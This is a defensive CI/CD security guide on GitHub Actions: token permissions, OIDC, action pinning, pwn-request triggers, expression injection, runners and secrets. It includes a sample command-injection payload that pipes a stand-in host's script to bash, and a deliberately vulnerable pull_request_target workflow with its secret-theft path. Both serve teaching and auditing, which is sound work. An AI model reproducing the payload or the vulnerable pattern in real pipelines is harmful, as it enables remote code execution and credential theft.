# 01 — Pipeline Security (CI workflows, tokens, triggers, runners)

Scope: GitHub Actions primarily; the same principles map to GitLab CI, CircleCI, Buildkite.
The pipeline is production infrastructure with code-execution-as-a-service attached to your
secrets. Treat workflow files with the same review rigor as auth code.

## 1.1 Least-privilege CI tokens

**Rule: every workflow declares a top-level `permissions:` block; jobs elevate individually.**
The implicit default (`write-all` on older repos, broad even on newer ones) means any
compromised step — a malicious action, an injected script — can push code, rewrite releases,
or poison caches.

```yaml
# GOOD — default deny, elevate per job
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write        # create the release — only this job
      id-token: write        # OIDC — only where federation happens
    runs-on: ubuntu-latest
```

```yaml
# BAD — no permissions block at all (inherits repo default),
# or the lazy hammer:
permissions: write-all
```

- Use `permissions: {}` when a workflow needs nothing (e.g., pure lint on checkout via a
  read-only token still needs `contents: read` — `{}` only when no repo access at all).
- `id-token: write` ONLY in jobs that actually federate. It mints identity tokens; an
  attacker with script execution in that job can impersonate the workflow to your cloud.
- Set the org/repo default token policy to read-only (Settings → Actions → Workflow
  permissions) so a missing block fails safe. Audit: a missing top-level block is High if
  the repo default is permissive, Medium if the default is read-only.
- GitLab: use `CI_JOB_TOKEN` scoping (job token allowlist), not group-level PATs in
  variables. Never store a PAT with `repo`/`api` scope as a CI secret when a scoped token
  or GitHub App installation token (`actions/create-github-app-token`) suffices.

## 1.2 OIDC to cloud — no stored cloud keys

**Rule: long-lived cloud credentials (AWS keys, GCP SA JSON, Azure client secrets) must not
exist in CI secrets.** They leak via logs, forks, compromised actions, and they never rotate.
Every major cloud accepts the CI provider's OIDC tokens.

```yaml
# GOOD — AWS via OIDC
- uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
  with:
    role-to-assume: arn:aws:iam::123456789012:role/repo-myorg-myrepo-deploy
    aws-region: eu-central-1
```

The security lives in the **trust policy condition on the `sub` claim**:

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:environment:production"
  }
}
```

- BAD: `"sub": "repo:myorg/*"` or `StringLike` with `repo:myorg/myrepo:*` — any branch,
  any fork-merged workflow, any PR environment in that repo can assume the role. Scope to
  `ref:refs/heads/main` or better `environment:production` (environments add reviewer
  gates, §1.7).
- One role per repo × purpose (plan vs apply, push-to-registry vs deploy). A shared
  "ci-role" with union permissions is a Critical finding when it spans prod write.
- Audit greps: `AWS_SECRET_ACCESS_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`, `AZURE_CLIENT_SECRET`
  in workflow `env:`/secrets usage → High (Critical if reachable from fork PRs).

## 1.3 Pin actions by commit SHA

**Rule: third-party actions are pinned to a full 40-char commit SHA with a version comment.**
Tags and branches are mutable; the tj-actions/changed-files compromise (2025) retagged
existing versions to exfiltrate CI secrets from thousands of repos — SHA-pinned consumers
were unaffected. The pattern keeps repeating: in March 2026 an attacker force-pushed 75
existing tags of aquasecurity/trivy-action to malicious commits (downstream, this
compromised Checkmarx's release pipeline), and in May 2026 every tag of
actions-cool/issues-helper was repointed to an imposter credential-stealing commit.
Tag-pinned consumers ran the malware on their next scheduled job; SHA-pinned consumers
did not.

```yaml
# GOOD — resolve the CURRENT release's commit SHA and pin that, tag in comment
# (gh api repos/actions/checkout/git/ref/tags/<tag> --jq .object.sha)
- uses: actions/checkout@<full-40-char-commit-sha>  # vN.N.N
# BAD
- uses: someorg/some-action@v3        # mutable tag
- uses: someorg/some-action@main      # tracking a branch — worse
```

- Pin transitively-trusted actions too (composite actions you own should pin their deps).
- **A SHA pin is necessary but not sufficient — verify the SHA is a real commit in
  the action's own repo.** GitHub stores a repo and its forks as one commit
  "network", so a commit that exists only in an attacker's fork can be referenced by
  the upstream `owner/repo@sha` slug (an "impostor commit"; the `github/dmca@565ece4`
  case is the classic example). Run zizmor's `impostor-commit` audit (an online check
  — needs a GitHub API token) in CI, and review external PRs that add/bump a pinned
  SHA by confirming the commit on the claimant repo.
- Keep pins fresh with Renovate (`helpers:pinGitHubActionDigests` preset) or Dependabot —
  a stale pin is a vuln-management problem, an unpinned action is a supply chain hole.
- `actions/*` (GitHub first-party) at a tag is tolerable (Low) but pin anyway for
  consistency; everything else unpinned is High.
- Enforce org-wide: Settings → Actions → "Allow specified actions" with an allowlist, or
  policy `allowed_actions` requiring pinned SHAs (e.g., via `actions-permissions` audits,
  zizmor, or OpenSSF Scorecard's Pinned-Dependencies check in CI). Action allowlisting is
  available on all GitHub plans including Free since Feb 2026 — "we're on the free tier"
  is no longer a reason to skip it.
- Platform fixes are coming but are not here yet: GitHub's 2026 Actions security roadmap
  (workflow dependency locking — a lockfile for `uses:` references — plus execution
  policies, scoped secrets, and a runner egress firewall) was preview/announced as of
  mid-2026. Until those are GA and adopted, SHA pinning remains the control; don't accept
  "immutable actions will fix it" in review.

## 1.4 Untrusted PR code: `pull_request_target`, `workflow_run`, `issue_comment`

**Rule: workflows triggered by privileged events must never execute attacker-controlled
content.** This is the #1 CI compromise class ("pwn request").

- `pull_request` from a fork: runs with read-only token, **no secrets** — safe by default.
  Keep it that way: do not enable "send secrets to fork PRs".
- `pull_request_target`: runs in the **base** repo context **with secrets and a write
  token**, on the PR event. Safe only if it never checks out or executes PR head content.

```yaml
# CRITICAL vulnerability — classic pwn request
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@...
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm ci && npm test                            # executes it with secrets present
```

Attacker path: open a PR whose `package.json` has a malicious `preinstall` script (or
modified test) → exfiltrate `secrets.*` and the write-scoped `GITHUB_TOKEN` → push to main.

Safe patterns, in order of preference:
1. Don't use `pull_request_target` at all. Labeling/commenting bots can use a separate
   workflow that only reads `github.event` metadata — no checkout.
2. Two-workflow split: untrusted `pull_request` workflow builds/tests with zero secrets and
   uploads results as an artifact; a `workflow_run` workflow with secrets downloads the
   artifact and **treats it as hostile input** (validate schema, never execute, never pass
   to a shell or `eval`-ish sink).
3. If you must check out the PR in a privileged context (rare; e.g., trusted-path docs
   preview), check out ONLY specific paths, require a maintainer-applied label
   (`if: contains(github.event.pull_request.labels.*.name, 'safe-to-test')`) that is
   re-applied per push, and run with minimal permissions and no cloud OIDC.

Same logic applies to `issue_comment`-triggered "/test" bots: the comment author may not
be the PR author; verify `author_association` is `MEMBER`/`OWNER` AND resolve the exact SHA
that was reviewed, not the branch head (TOCTOU: attacker pushes after approval comment).

## 1.5 Script injection in workflow expressions

**Rule: never interpolate attacker-influenced `${{ }}` expressions into `run:`, `script:`
(github-script), or action inputs that reach a shell.** Expression expansion happens
*before* the shell sees the text — quoting inside the script does not help.

Attacker-controlled contexts include: `github.event.pull_request.title|body`,
`github.event.issue.title|body`, `github.event.comment.body`, `github.head_ref` (branch
name!), `github.event.pull_request.head.ref`, commit messages
(`github.event.head_commit.message`), author names/emails, `github.event.review.body`.

```yaml
# BAD — title of `a"; curl evil.sh | bash; echo "` executes
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# GOOD — env indirection; the value is data, not script text
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

- In `actions/github-script`, same rule: pass via `env` and read `process.env`, or use
  the provided `context` object — never template untrusted strings into the JS body.
- `github.head_ref` in cache keys, artifact names, or `docker tag` arguments also needs
  sanitization (branch names allow `/`, `$`, quotes).
- Lint for this: `zizmor` and `actionlint` both flag expression injection — run them in CI
  over `.github/workflows/`.
- Severity: injection reachable from a fork PR/issue into a secrets-bearing job = Critical;
  into a no-secret read-only job = Medium (still grants runner exec + token).

## 1.6 Runner trust

- **Never attach self-hosted runners to public repos** where fork PRs can schedule jobs:
  that is remote code execution on your infrastructure by anonymous users. GitHub-hosted
  only for public-repo PR workflows. (High→Critical depending on runner network position.)
- Self-hosted runners must be **ephemeral** (one job, then destroyed — `--ephemeral`,
  actions-runner-controller with ephemeral pods). Persistent runners accumulate
  credentials, poisoned caches, and cross-job contamination.
- Isolate runner network egress (no metadata-service access unless needed, egress
  allowlists where feasible — exfiltration via `curl` is the standard post-exploit step;
  tools like Harden-Runner provide egress auditing/blocking on hosted runners).
- Cache poisoning: `actions/cache` is scoped, but a cache written by a default-branch
  workflow is trusted by all branches. Never cache across trust boundaries (e.g., don't
  restore caches written by PR workflows into release builds; scope keys by ref where the
  content influences build output). **For release/publish/signing workflows, disable
  build caching outright** — a single poisoned cache entry restored into a job that signs
  or publishes taints the released artifact; the speedup isn't worth the supply-chain risk.

## 1.7 Protected branches, environments, signed commits

- Default branch protection (or rulesets, preferred — they apply to admins by default):
  require PRs, ≥1 review (2 for prod-deploying repos), **dismiss stale approvals on new
  push**, require status checks listed by exact name, block force-push and deletion,
  require linear history if your audit story depends on it. "Include administrators" must
  be on; an admin-bypassable gate is not a gate (High).
- **Environments** for anything that deploys: `environment: production` with required
  reviewers, wait timers if useful, and **deployment branch policy** restricted to
  `main`/release tags. Secrets needed only for deploy live in the environment, not at repo
  level — this is what makes the OIDC `sub` claim `environment:production` meaningful.
- **Signed commits/tags**: enable "require signed commits" via ruleset on protected
  branches when the team has signing set up (SSH signing keys or Sigstore `gitsign`).
  Enable vigilant mode so unsigned/unverified shows explicitly. Don't claim integrity from
  the green "Verified" badge alone — web-UI commits are signed by GitHub's key; decide
  whether that satisfies your threat model and document it.
- **Tag protection**: protect release tag patterns (`v*`) via rulesets — release pipelines
  trust tags; anyone who can create `v1.2.4` can ship code (see rules/02 §release integrity).

## 1.8 Workflow file ownership and change control

- CODEOWNERS entry for `/.github/workflows/` (and composite actions, reusable workflows)
  routing to the platform/security team. A workflow change IS a deployment-credential
  change. The May 2026 "Megalodon" campaign pushed secret-stealing workflow commits to
  5,500+ repos in a six-hour window — direct-push rights to workflow files plus no
  workflow-modification alerting (rules/07 §7.3.1) is exactly what it exploited.
- Reusable workflows (`workflow_call`) centralize hardened patterns: callers can't weaken
  pinned steps inside them. Pin the reusable workflow reference by SHA too
  (`uses: org/ci/.github/workflows/build.yml@<sha>`).
- Forbid `workflow_dispatch` inputs flowing into shells unsanitized (same as §1.5) and
  audit who has Actions write (can dispatch with arbitrary inputs).
- Disable Actions entirely on repos that don't need it (org policy: "Allow select repos").

## 1.9 Concurrency, caches, and run integrity

- `concurrency:` groups on deploy workflows (`group: deploy-prod, cancel-in-progress:
  false`) — two concurrent applies/deploys interleaving is a corruption class, and
  cancel-in-progress on a deploy can kill a half-finished migration. Cancel-in-progress
  *is* right for PR validation (saves runners, no integrity stake).
- Re-run semantics: re-running an old workflow run re-executes old workflow code with
  *current* secrets — relevant after rotating a compromised workflow; revoke environments
  or disable old runs rather than assuming history is inert.
- Lint the workflow estate continuously: `zizmor` (injection, pwn-requests, unpinned,
  excessive permissions, `impostor-commit`) and `actionlint` as a required check on
  `.github/workflows/**` changes — the linters encode most of §§1.1–1.5 and catch
  regressions humans rubber-stamp. Add **CodeQL's `actions` language** (GA April 2025;
  auto-enabled in code-scanning *default setup* when workflow files are present, or add
  `actions` to the language matrix in advanced setup) — it does taint/data-flow analysis
  on workflows that the YAML linters can't.

## 1.10 Secrets hygiene in CI

- Secrets are masked in logs by value-match only: derived values (base64 of a secret, a
  URL embedding it) print in cleartext. Register any value you compute from a secret with
  `echo "::add-mask::$VALUE"` before it can be printed. Never log request bodies/headers
  in CI; set `ACTIONS_STEP_DEBUG` consciously.
- **Never `secrets: inherit` when calling a reusable workflow** — it hands the called
  workflow *every* secret in scope. Pass each secret explicitly with `secrets:`
  (least privilege), and pin the reusable workflow by SHA (§1.8).
- Scope: org secret < repo secret < environment secret. Push every prod credential down to
  an environment with required reviewers.
- No secrets in `if:` conditions or step outputs (outputs are visible to later steps of
  other jobs via needs-context and stored in logs metadata).
- Rotate on any workflow-compromise suspicion; assume any secret present in a job's env at
  the time of a malicious step is gone.
- Prefer fetching at use-time from a secrets manager via OIDC (Vault JWT auth, AWS Secrets
  Manager) over storing in GitHub at all — central audit + rotation.

## Audit checklist

- [ ] Every workflow has a top-level `permissions:` block; no `write-all`; `id-token: write` only in federating jobs
- [ ] No long-lived cloud keys in secrets; OIDC trust policies pin `aud` and an exact `sub` (repo + ref/environment, no wildcards)
- [ ] All third-party actions pinned to full commit SHAs with version comments; pins maintained by Renovate/Dependabot; org actions-allowlist enabled
- [ ] No `pull_request_target`/`workflow_run` job checks out or executes PR head content while secrets/write token are present; label gates (if any) re-applied per push and SHA-pinned at approval
- [ ] No untrusted context (`title`, `body`, `head_ref`, commit message, comment) interpolated into `run:`/`github-script`/shell-reaching inputs — all via `env:`; zizmor/actionlint run in CI
- [ ] Self-hosted runners: none on public repos; ephemeral; egress monitored; caches not shared across trust boundaries
- [ ] Default branch ruleset: PR + review required, stale-approval dismissal, exact required checks, no force-push, applies to admins; release tags protected
- [ ] Deploy jobs use `environment:` with required reviewers and branch policy; prod secrets live at environment scope
- [ ] CODEOWNERS covers `.github/workflows/`; reusable workflows pinned by SHA
- [ ] No secrets echoed, embedded in URLs, or passed through step outputs; rotation path documented
